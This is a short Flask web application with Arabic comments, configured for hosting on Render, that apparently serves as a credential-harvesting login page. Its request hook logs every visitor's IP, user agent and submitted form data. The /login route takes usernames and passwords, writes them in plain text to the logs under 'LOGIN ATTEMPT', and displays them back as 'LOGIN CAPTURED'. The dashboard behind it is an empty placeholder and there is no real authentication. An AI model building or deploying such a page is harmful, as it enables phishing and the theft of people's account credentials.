from flask import Flask, request, redirect
import os
import logging

app = Flask(__name__)

# تفعيل logging
logging.basicConfig(level=logging.INFO)

# تسجيل كل الطلبات
@app.before_request
def log_request_info():
    logging.info("====== NEW REQUEST ======")
    logging.info(f"IP: {request.remote_addr}")
    logging.info(f"Method: {request.method}")
    logging.info(f"URL: {request.url}")
    logging.info(f"User-Agent: {request.headers.get('User-Agent')}")
    
    if request.method == "POST":
        logging.info(f"POST DATA: {request.form}")
    else:
        logging.info(f"GET PARAMS: {request.args}")

# الصفحة الرئيسية
@app.route('/')
def home():
    return "<h1>Home Page</h1>"

# تسجيل الدخول (🔥 معدل)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        # 🔥 طباعة قوية في logs
        logging.warning("====== LOGIN ATTEMPT ======")
        logging.warning(f"Username: {username}")
        logging.warning(f"Password: {password}")

        # 🔥 عرض مباشر للتأكيد 100%
        return f"""
        <h2>LOGIN CAPTURED ✅</h2>
        <p>Username: {username}</p>
        <p>Password: {password}</p>
        <a href="/dashboard">Go to Dashboard</a>
        """

    return '''
    <form method="POST" action="/login">
        <input name="username" placeholder="Username" required><br>
        <input name="password" type="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
    </form>
    '''

# لوحة التحكم
@app.route('/dashboard')
def dashboard():
    return "<h1>Dashboard</h1>"

# تسجيل الخروج
@app.route('/logout')
def logout():
    return redirect('/login')

# تشغيل مناسب لـ Render
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
